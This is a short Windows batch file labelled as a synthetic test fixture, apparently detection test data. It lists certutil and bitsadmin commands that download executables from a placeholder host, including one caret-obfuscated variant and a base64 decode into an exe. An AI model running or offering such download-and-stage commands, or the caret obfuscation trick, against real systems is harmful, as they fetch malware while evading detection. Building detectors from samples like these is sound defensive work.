@echo off
rem SYNTHETIC TEST FIXTURE — not functional
certutil -urlcache -f https://payload.example.invalid/a.exe a.exe
cert^util -url^cache -f https://payload.example.invalid/b.exe b.exe
certutil -decode a.b64 a.exe
bitsadmin /transfer job https://payload.example.invalid/c.exe c.exe
